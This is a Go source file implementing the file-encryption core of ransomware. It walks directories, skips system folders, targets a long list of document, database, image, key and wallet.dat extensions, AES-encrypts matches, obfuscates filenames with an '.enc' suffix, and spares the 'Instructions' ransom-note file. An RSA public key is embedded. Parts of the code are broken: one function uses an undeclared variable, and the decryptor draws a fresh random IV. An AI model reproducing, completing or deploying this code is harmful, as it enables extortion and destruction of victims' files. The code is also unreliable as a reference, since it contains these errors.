package aes

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"

	"../base64"
)

var plaintext []byte

var exts = []string{".mp4", ".avi", ".mp3", ".jpg", ".odt", ".mid", ".wma", ".flv",
	".mkv", ".mov", ".avi", ".asf", ".mpeg", ".vob", ".mpg", ".wmv", ".fla", ".swf",
	".wav", ".qcow2", ".vmx", ".gpg", ".aes", ".ARC", ".PAQ", ".tbk", ".bak", ".djv",
	".djvu", ".bmp", ".png", ".gif", ".raw", ".cgm", ".jpeg", ".jpg", ".tif",
	".tiff", ".NEF", ".psd", ".cmd", ".bat", ".class", ".java", ".asp", ".brd",
	".sch", ".dch", ".dip", ".vbs", ".asm", ".pas", ".cpp", ".php", ".ldf", ".mdf",
	".ibd", ".MYI", ".MYD", ".frm", ".odb", ".dbf", ".mdb", ".sql", ".SQLITEDB",
	".SQLITE3", ".asc", ".lay6", ".lay", ".ms11", ".sldm", ".sldx", ".ppsm",
	".ppsx", ".ppam", ".docb", ".mml", ".sxm", ".otg", ".odg", ".uop", ".potx",
	".potm", ".pptx", ".pptm", ".std", ".sxd", ".pot", ".pps", ".sti", ".sxi",
	".otp", ".odp", ".wks", ".xltx", ".xltm", ".xlsx", ".xlsm", ".xlsb", ".slk",
	".xlw", ".xlt", ".xlm", ".xlc", ".dif", ".stc", ".sxc", ".ots", ".ods", ".hwp",
	".dotm", ".dotx", ".docm", ".docx", ".DOT", ".max", ".xml", ".txt", ".CSV",
	".uot", ".RTF", ".pdf", ".XLS", ".PPT", ".stw", ".sxw", ".ott", ".odt",
	".DOC", ".pem", ".csr", ".crt", ".key", "wallet.dat",
}
var badfolders = []string{"tmp", "winnt", "Application Data", "AppData",
	"Program Files (x86)", "Program Files", "temp", "thumbs.db", "Recycle.Bin",
	"System Volume Information", "Boot", "Windows",
}

var block cipher.Block
var key []byte

// Ext is the encrypted appended extension
var Ext = ".enc"

var pubKey = `-----BEGIN PUBLIC KEY-----
MIGgMA0GCSqGSIb3DQEBAQUAA4GOADCBigKBgQDQIHdNPClJAZVUb9AiPk/A7dAP
V2+6HLiw1pZyEZel+Pr0Z53uakh0BD1mNzZzfCr3AyCGqhxveyg5SItX8Ce8DQhN
Kl9TBjPjNjAKb4XF2kKZepMjOM2sgLsdAotYAZcUiczssmgxkHaUpoYtTs6YJadE
ypklH1uu6oM6xiVK/wIEDhO6Xw==
-----END PUBLIC KEY-----`

// EncryptDocumets Walks documments in a path and encript or decrypts them.
func EncryptDocumets(path string, mode bool) {
	if mode {
		//Encrypt
		filepath.Walk(path, visit)
	} else {
		//Decrpy
		filepath.Walk(path, visitD)
	}

}

// InitializeBlock Sets up the encription with a key
func InitializeBlock(myKey []byte) {
	key = myKey
	block, _ = aes.NewCipher(key)

}
func initIV() (stream cipher.Stream, iv []byte) {
	iv = make([]byte, aes.BlockSize)
	_, err := rand.Read(iv)
	if err != nil {
		fmt.Println("error:", err)
		return
	}
	stream = cipher.NewCTR(block, iv[:])
	return stream, iv
}
func initWithIV(myIv []byte) cipher.Stream {
	stream = cipher.NewCTR(block, myIv[:])
}

func visit(path string, f os.FileInfo, err error) error {
	for _, folder := range badfolders {
		if strings.Contains(path, folder) {
			return nil
		}
	}
	if !strings.Contains(path, Ext) && !strings.Contains(path, "Instructions") {
		for _, ext := range exts {
			if strings.Contains(path, ext) {
				StreamEncrypter(path)
				return nil
			}

		}
	}
	return nil
}
func visitD(path string, f os.FileInfo, err error) error {
	if strings.Contains(path, Ext) && !f.IsDir() {
		StreamDecrypter(path)
	}
	return nil
}

// StreamDecrypter decryps a file given its filepath
func StreamDecrypter(path string) (err error) {
	inFile, err := os.Open(path)
	if err != nil {
		fmt.Println("error:", err)
		return
	}

	deobfPath := filenameDeobfuscator(path)
	outFile, err := os.OpenFile(deobfPath, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0777)
	if err != nil {
		return
	}
	defer outFile.Close()
	// TODO Change
	stream, _ := initIV()

	reader := &cipher.StreamReader{S: stream, R: inFile}
	if _, err = io.Copy(outFile, reader); err != nil {
		fmt.Println(err)
	}
	inFile.Close()

	//os.Remove(path)
	return
}

// StreamEncrypter encrypts a file given its filepatth
func StreamEncrypter(path string) (err error) {
	inFile, err := os.Open(path)
	if err != nil {
		fmt.Println(err)
		return
	}

	obfuscatePath := filenameObfuscator(path)
	outFile, err := os.OpenFile(obfuscatePath, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0777)
	fmt.Println(outFile.Name())

	if err != nil {
		fmt.Println(err)
		return
	}

	stream, iv := initIV()
	outFile.Write(iv)
	writer := &cipher.StreamWriter{S: stream, W: outFile}

	if _, err = io.Copy(writer, inFile); err != nil {
		fmt.Println(err.Error())
	}
	inFile.Close()
	outFile.Close()
	//os.Remove(path)
	return nil
}

func filenameObfuscator(path string) string {
	filenameArr := strings.Split(path, string(os.PathSeparator))
	filename := filenameArr[len(filenameArr)-1]
	path2 := strings.Join(filenameArr[:len(filenameArr)-1], string(os.PathSeparator))

	return path2 + string(os.PathSeparator) + base64.Encode(filename) + Ext

}
func filenameDeobfuscator(path string) string {
	//get the path for the output
	opPath := strings.Trim(path, Ext)
	// Divide filepath
	filenameArr := strings.Split(opPath, string(os.PathSeparator))
	//Get base64 encoded filename
	filename := filenameArr[len(filenameArr)-1]
	// get parent dir
	path2 := strings.Join(filenameArr[:len(filenameArr)-1], string(os.PathSeparator))
	return path2 + string(os.PathSeparator) + base64.Decode(filename)
}
